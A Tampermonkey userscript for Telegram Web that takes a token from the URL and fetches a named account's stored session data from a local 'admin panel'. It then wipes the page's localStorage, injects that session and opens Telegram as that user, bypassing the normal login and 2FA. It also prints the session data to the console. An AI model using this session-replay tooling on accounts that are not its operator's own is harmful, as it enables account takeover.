// ==UserScript==
// @name         Telegram Auto-Login
// @namespace    http://tampermonkey.net/
// @version      1.3
// @description  Automatically logs in to Telegram Web by injecting localStorage data from admin panel
// @author       You
// @match        https://web.telegram.org/*
// @grant        GM_xmlhttpRequest
// ==/UserScript==

/**
 * Telegram Auto-Login User Script
 * 
 * This script is designed to run inside Tampermonkey.
 * It automatically logs in to Telegram Web by injecting localStorage data
 * from the admin panel when a token is provided in the URL query parameters.
 */

(function () {
  'use strict';

  console.log('🔐 Telegram Auto-Login script loaded');

  // Check if GM_xmlhttpRequest is available (Tampermonkey/Greasemonkey/Violentmonkey)
  const hasGM = typeof GM_xmlhttpRequest !== 'undefined' ||
    (typeof GM !== 'undefined' && typeof GM.xmlHttpRequest !== 'undefined');
  const GM_xhr = typeof GM_xmlhttpRequest !== 'undefined' ? GM_xmlhttpRequest :
    (typeof GM !== 'undefined' && GM.xmlHttpRequest) ? GM.xmlHttpRequest : null;

  console.log('🔧 Userscript API available:', hasGM ? 'Yes (GM_xmlhttpRequest)' : 'No (using fetch - may be blocked)');

  if (!hasGM) {
    console.warn('⚠️ GM_xmlhttpRequest not available. Mixed content may be blocked.');
    console.warn('💡 Install Tampermonkey/Greasemonkey/Violentmonkey for full functionality.');
  }

  // Create system info box
  function createSystemInfoBox() {
    const infoBox = document.createElement('div');
    infoBox.id = 'telegram-auto-login-info';
    infoBox.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.8);
            color: #00ff00;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            z-index: 9999;
            pointer-events: none;
            border: 1px solid #333;
            min-width: 200px;
        `;

    function updateInfo() {
      const urlParams = new URLSearchParams(window.location.search);
      const token = urlParams.get('token');
      const serverPort = urlParams.get('port') || '3000';
      const hasWorker = typeof Worker !== 'undefined';
      const hasServiceWorker = 'serviceWorker' in navigator;

      infoBox.innerHTML = `
                <div><strong>🔐 Telegram Auto-Login</strong></div>
                <div>URL: ${window.location.hostname}</div>
                <div>Token: ${token ? '✅ Found' : '❌ None'}</div>
                <div>Server: localhost:${serverPort}</div>
                <div>Worker: ${hasWorker ? '✅' : '❌'}</div>
                <div>SW: ${hasServiceWorker ? '✅' : '❌'}</div>
                <div>Time: ${new Date().toLocaleTimeString()}</div>
            `;
    }

    updateInfo();
    setInterval(updateInfo, 1000);
    document.body.appendChild(infoBox);
  }

  // Configuration: Server port (can be overridden via URL parameter)
  const urlParams = new URLSearchParams(window.location.search);
  const token = urlParams.get('token');
  const serverPort = urlParams.get('port') || '3000'; // Default to 3000 (admin is running on 3000)
  const serverUrl = `http://localhost:${serverPort}`;

  if (!token) {
    console.log('ℹ️ No token found in URL, skipping auto-login');
    // Still create info box for debugging
    setTimeout(createSystemInfoBox, 1000);
    return;
  }

  console.log('🔍 Found token in URL:', token);
  console.log('🌐 Using server URL:', serverUrl);

  // Create system info box
  setTimeout(createSystemInfoBox, 500);

  // Universal HTTP request function that uses GM_xmlhttpRequest if available (bypasses CORS/mixed content)
  function makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
      // Use GM_xmlhttpRequest if available (bypasses mixed content and CORS)
      if (GM_xhr) {
        console.log('📡 Using GM_xmlhttpRequest (bypasses mixed content/CORS)');
        GM_xhr({
          method: options.method || 'GET',
          url: url,
          headers: options.headers || {},
          timeout: options.timeout || 10000,
          onload: function (response) {
            resolve({
              ok: response.status >= 200 && response.status < 300,
              status: response.status,
              json: async () => JSON.parse(response.responseText),
              text: async () => response.responseText
            });
          },
          onerror: function (error) {
            reject(new Error(`Network error: ${error.message || 'Unknown error'}`));
          },
          ontimeout: function () {
            reject(new Error('Request timeout'));
          }
        });
      } else {
        // Fallback to fetch (subject to mixed content restrictions)
        console.log('📡 Using fetch (may be blocked by mixed content)');
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), options.timeout || 10000);

        fetch(url, {
            method: options.method || 'GET',
            headers: options.headers || {},
            mode: 'cors',
            credentials: 'omit',
            cache: 'no-cache',
            signal: controller.signal
          })
          .then(response => {
            clearTimeout(timeoutId);
            resolve(response);
          })
          .catch(error => {
            clearTimeout(timeoutId);
            reject(error);
          });
      }
    });
  }

  // Function to test if a server is accessible
  async function testServerConnection(url) {
    try {
      const response = await makeRequest(`${url}/health`, {
        method: 'GET',
        timeout: 3000
      });
      return response.ok;
    } catch (error) {
      return false;
    }
  }

  // Function to find the correct server port
  async function findServerPort() {
    const possiblePorts = [serverPort, '3000', '3005'];
    const uniquePorts = [...new Set(possiblePorts)];

    for (const port of uniquePorts) {
      const testUrl = `http://localhost:${port}`;
      const isAccessible = await testServerConnection(testUrl);
      if (isAccessible) {
        console.log(`✅ Server found on port ${port}`);
        return port;
      }
    }
    return null;
  }

  // Function to fetch session data using token
  async function fetchSessionData(token) {
    try {
      console.log('📡 Fetching session data using token...');

      // Try to detect server port, fallback to default
      const detectedPort = await findServerPort();
      const finalServerUrl = detectedPort ? `http://localhost:${detectedPort}` : serverUrl;

      if (detectedPort) {
        console.log(`✅ Using detected server on port ${detectedPort}`);
      }

      const response = await makeRequest(`${finalServerUrl}/api/telegram-login/${token}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 10000
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({
          error: 'Unknown error'
        }));
        throw new Error(`HTTP error! status: ${response.status}, message: ${errorData.error}`);
      }

      const data = await response.json();
      console.log('✅ Session data fetched:', data);
      return data;

    } catch (error) {
      console.error('❌ Error fetching session data:', error);

      // Show user-friendly error message
      const errorDiv = document.createElement('div');
      errorDiv.style.cssText = `
                position: fixed;
                top: 20px;
                left: 50%;
                transform: translateX(-50%);
                background: #dc3545;
                color: white;
                padding: 15px 25px;
                border-radius: 8px;
                z-index: 9999;
                box-shadow: 0 4px 12px rgba(0,0,0,0.5);
                font-family: Arial, sans-serif;
                text-align: center;
                max-width: 400px;
            `;

      let solutionText = '';
      if (!hasGM) {
        solutionText = `
          <strong>⚠️ GM_xmlhttpRequest not available</strong><br>
          Install Tampermonkey/Greasemonkey for full functionality.<br>
          Otherwise, mixed content may be blocked by browser.
        `;
      } else {
        solutionText = `
          <strong>❌ Connection Failed</strong><br>
          Could not connect to admin panel at ${serverUrl}<br><br>
          <strong>Check:</strong><br>
          • Is the admin panel running?<br>
          • Can you access http://localhost:3000/health?<br>
          • Check browser console for details
        `;
      }

      errorDiv.innerHTML = `
                <strong>🔐 Auto-Login Failed</strong><br>
                <small>${solutionText}</small>
            `;
      document.body.appendChild(errorDiv);

      // Remove error message after 10 seconds
      setTimeout(() => {
        if (errorDiv.parentNode) {
          errorDiv.parentNode.removeChild(errorDiv);
        }
      }, 10000);

      return null;
    }
  }

  // Function to inject localStorage data
  function injectLocalStorage(localStorageData) {
    try {
      console.log('💾 Injecting localStorage data...');

      // If it's a string (old format with code), we can't use eval due to CSP
      // Instead, we expect an object with key-value pairs
      if (typeof localStorageData === 'string') {
        console.error('❌ String format localStorage not supported due to CSP restrictions');
        console.error('Server must send localStorage data as an object, not code string');
        return false;
      }

      // Clear existing localStorage first to avoid conflicts
      localStorage.clear();

      // Inject each key-value pair directly
      if (typeof localStorageData === 'object' && localStorageData !== null) {
        Object.keys(localStorageData).forEach(key => {
          const value = localStorageData[key];
          // localStorage only stores strings, so convert if needed
          const valueStr = typeof value === 'string' ? value : JSON.stringify(value);
          localStorage.setItem(key, valueStr);
          console.log(`✅ Set localStorage['${key}']`);
        });
      }

      console.log('✅ LocalStorage data injected successfully');
      return true;

    } catch (error) {
      console.error('❌ Error injecting localStorage:', error);
      return false;
    }
  }


  // Main execution function
  async function executeAutoLogin() {
    console.log('🚀 Starting auto-login process...');

    // Show loading indicator
    const loadingDiv = document.createElement('div');
    loadingDiv.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #17a2b8;
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            z-index: 9999;
            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
            font-family: Arial, sans-serif;
            text-align: center;
        `;
    loadingDiv.innerHTML = `
            <strong>🔐 Auto-Login in Progress...</strong><br>
            <small>Fetching session data and injecting...</small>
        `;
    document.body.appendChild(loadingDiv);

    try {
      // Fetch session data
      const sessionData = await fetchSessionData(token);

      if (!sessionData) {
        console.log('❌ No session data received');
        loadingDiv.remove();
        return;
      }

      // Update loading message
      loadingDiv.innerHTML = `
                <strong>🔐 Injecting Session...</strong><br>
                <small>Logging in as: ${sessionData.username || 'Unknown User'}</small>
            `;

      // Inject localStorage data
      const success = injectLocalStorage(sessionData.localStorageCode);

      if (success) {
        // Update loading message
        loadingDiv.innerHTML = `
                    <strong>✅ Login Successful!</strong><br>
                    <small>Redirecting to Telegram...</small>
                `;

        // Wait a moment for user to see the success message, then redirect
        setTimeout(() => {
          console.log('✅ Auto-login completed! Redirecting to Telegram app...');
          // Redirect to the Telegram web app
          window.location.href = 'https://web.telegram.org/a/';
        }, 1500);

      } else {
        throw new Error('Failed to inject localStorage data');
      }

    } catch (error) {
      console.error('❌ Auto-login failed:', error);

      // Update loading message to show error
      loadingDiv.style.background = '#dc3545';
      loadingDiv.innerHTML = `
                <strong>❌ Auto-Login Failed</strong><br>
                <small>Error: ${error.message}</small>
            `;

      // Remove error message after 5 seconds
      setTimeout(() => {
        loadingDiv.remove();
      }, 5000);
    }
  }

  // Wait for DOM to be ready, then execute
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', executeAutoLogin);
  } else {
    executeAutoLogin();
  }

})();